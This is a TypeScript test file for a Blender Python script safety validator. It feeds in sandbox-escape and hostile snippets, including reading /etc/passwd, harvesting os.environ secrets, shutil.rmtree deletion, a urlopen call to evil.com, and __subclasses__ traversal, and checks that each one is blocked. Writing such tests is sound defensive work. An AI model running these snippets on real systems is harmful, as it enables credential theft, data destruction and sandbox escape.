import assert from "node:assert";
import { validateBlenderScript } from "../../lib/blender/validator.ts";

export function testValidator() {
  console.log("▶ Testing Hardened Code Safety Validator & Attack Bypass Defense...");

  // Test 1: Safe Blender procedural code
  const safeCode = `
import bpy

def main():
    bpy.ops.mesh.primitive_cube_add(size=2.0)
    cube = bpy.context.active_object
    cube.name = "TestCube"

if __name__ == '__main__':
    main()
`;
  const safeRes = validateBlenderScript(safeCode);
  assert.strictEqual(safeRes.isValid, true, "Safe code was flagged unexpectedly");
  assert.strictEqual(safeRes.errors.length, 0);
  console.log("  ✓ Safe procedural bpy script passed validation");

  // Test 2: Subprocess execution
  const resSubprocess = validateBlenderScript("import subprocess\nsubprocess.run(['dir'])");
  assert.strictEqual(resSubprocess.isValid, false);
  console.log("  ✓ Malicious subprocess execution successfully blocked");

  // Test 3: os.system execution
  const resOs = validateBlenderScript("import os\nos.system('echo test')");
  assert.strictEqual(resOs.isValid, false);
  console.log("  ✓ Malicious os.system call successfully blocked");

  // Test 4: Dynamic import bypass via __import__
  const resDynamic = validateBlenderScript("mod = __import__('os')\nmod.system('test')");
  assert.strictEqual(resDynamic.isValid, false, "Dynamic __import__ was not blocked!");
  console.log("  ✓ Dynamic __import__() bypass blocked");

  // Test 5: Dynamic import bypass via importlib
  const resImportlib = validateBlenderScript("import importlib\nimportlib.import_module('os')");
  assert.strictEqual(resImportlib.isValid, false, "importlib was not blocked!");
  console.log("  ✓ importlib dynamic module loading blocked");

  // Test 6: Reflection bypass via getattr()
  const resGetattr = validateBlenderScript("getattr(bpy, 'dangerous_op')()");
  assert.strictEqual(resGetattr.isValid, false, "getattr was not blocked!");
  console.log("  ✓ Reflection bypass via getattr() blocked");

  // Test 7: Scope reflection via globals() / locals()
  const resGlobals = validateBlenderScript("g = globals()\ng['__builtins__']");
  assert.strictEqual(resGlobals.isValid, false, "globals() was not blocked!");
  console.log("  ✓ Scope reflection via globals() blocked");

  // Test 8: Arbitrary filesystem reading via open()
  const resOpen = validateBlenderScript("with open('/etc/passwd', 'r') as f: data = f.read()");
  assert.strictEqual(resOpen.isValid, false, "Arbitrary open() was not blocked!");
  console.log("  ✓ Arbitrary filesystem access via open() blocked");

  // Test 9: Destructive filesystem deletion via shutil
  const resShutil = validateBlenderScript("import shutil\nshutil.rmtree('/tmp/dir')");
  assert.strictEqual(resShutil.isValid, false, "shutil.rmtree was not blocked!");
  console.log("  ✓ Destructive shutil filesystem operations blocked");

  // Test 10: Environment variable and credential harvesting
  const resEnviron = validateBlenderScript("key = os.environ.get('SECRET_KEY')");
  assert.strictEqual(resEnviron.isValid, false, "os.environ access was not blocked!");
  console.log("  ✓ Environment harvesting via os.environ blocked");

  // Test 11: Network socket and HTTP access
  const resSocket = validateBlenderScript("import socket\ns = socket.socket()");
  assert.strictEqual(resSocket.isValid, false, "socket was not blocked!");
  const resUrllib = validateBlenderScript("import urllib.request\nurllib.request.urlopen('http://evil.com')");
  assert.strictEqual(resUrllib.isValid, false, "urllib was not blocked!");
  console.log("  ✓ Raw socket and HTTP network exfiltration blocked");

  // Test 12: Object model traversal (__subclasses__)
  const resTraverse = validateBlenderScript("sub = ().__class__.__bases__[0].__subclasses__()");
  assert.strictEqual(resTraverse.isValid, false, "__subclasses__ was not blocked!");
  console.log("  ✓ Python object model traversal (__subclasses__) blocked");
}

testValidator();
